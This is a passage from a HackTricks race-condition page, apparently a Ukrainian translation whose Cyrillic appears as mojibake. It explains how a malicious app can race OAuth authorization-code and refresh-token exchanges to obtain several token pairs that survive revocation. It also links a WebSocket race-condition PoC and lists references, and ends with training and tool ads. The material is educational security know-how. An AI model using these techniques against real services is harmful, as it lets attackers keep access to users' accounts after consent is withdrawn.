**–ü—Ä–æ–±–ª–µ–º–∞** –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ –≤–∏ **–ø—Ä–∏–π–º–∞—î—Ç–µ —Ü–µ** —ñ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –Ω–∞–¥—Å–∏–ª–∞—î—Ç–µ **`authorization_code`** –∑–ª–æ–≤–º–∏—Å–Ω–æ–º—É –¥–æ–¥–∞—Ç–∫—É. –ü–æ—Ç—ñ–º —Ü–µ–π **–¥–æ–¥–∞—Ç–æ–∫ –∑–ª–æ–≤–∂–∏–≤–∞—î —É–º–æ–≤–æ—é –≥–æ–Ω–∫–∏ –≤ —Å–µ—Ä–≤—ñ—Å—ñ OAUth, —â–æ–± –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –±—ñ–ª—å—à–µ –Ω—ñ–∂ –æ–¥–∏–Ω AT/RT** (_–¢–æ–∫–µ–Ω –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó/–¢–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è_) –∑ **`authorization_code`** –¥–ª—è –≤–∞—à–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É. –í –æ—Å–Ω–æ–≤–Ω–æ–º—É, –≤—ñ–Ω –∑–ª–æ–≤–∂–∏–≤–∞—î —Ç–∏–º —Ñ–∞–∫—Ç–æ–º, —â–æ –≤–∏ –ø—Ä–∏–π–Ω—è–ª–∏ –¥–æ–¥–∞—Ç–æ–∫ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –≤–∞—à–∏—Ö –¥–∞–Ω–∏—Ö, —â–æ–± **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤**. –ü–æ—Ç—ñ–º, —è–∫—â–æ –≤–∏ **–ø—Ä–∏–ø–∏–Ω–∏—Ç–µ –¥–æ–∑–≤–æ–ª—è—Ç–∏ –¥–æ–¥–∞—Ç–∫—É –¥–æ—Å—Ç—É–ø –¥–æ –≤–∞—à–∏—Ö –¥–∞–Ω–∏—Ö, –æ–¥–Ω–∞ –ø–∞—Ä–∞ AT/RT –±—É–¥–µ –≤–∏–¥–∞–ª–µ–Ω–∞, –∞–ª–µ —ñ–Ω—à—ñ –∑–∞–ª–∏—à–∞—Ç—å—Å—è –¥—ñ–π—Å–Ω–∏–º–∏**.

#### –£–º–æ–≤–∞ –≥–æ–Ω–∫–∏ –≤ `Refresh Token`

–Ø–∫—â–æ –≤–∏ **–æ—Ç—Ä–∏–º–∞–ª–∏ –¥—ñ–π—Å–Ω–∏–π RT**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –Ω–∏–º –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –∫—ñ–ª—å–∫–æ—Ö AT/RT**, —ñ **–Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Å–∫–∞—Å–æ–≤—É—î –¥–æ–∑–≤–æ–ª–∏** –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ –¥–æ–¥–∞—Ç–∫—É –Ω–∞ –¥–æ—Å—Ç—É–ø –¥–æ –π–æ–≥–æ –¥–∞–Ω–∏—Ö, **–∫—ñ–ª—å–∫–∞ RT –∑–∞–ª–∏—à–∞—Ç—å—Å—è –¥—ñ–π—Å–Ω–∏–º–∏.**

## **–£–º–æ–≤–∞ –≥–æ–Ω–∫–∏ –≤ WebSockets**

–£ [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ PoC –Ω–∞ Java –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –≤–µ–±—Å–æ–∫–µ—Ç–Ω–∏—Ö –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å **–ø–∞—Ä–∞–ª–µ–ª—å–Ω–æ**, —â–æ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ **—É–º–æ–≤–∞–º–∏ –≥–æ–Ω–∫–∏ —Ç–∞–∫–æ–∂ —É –≤–µ–±—Å–æ–∫–µ—Ç–∞—Ö**.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
* [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
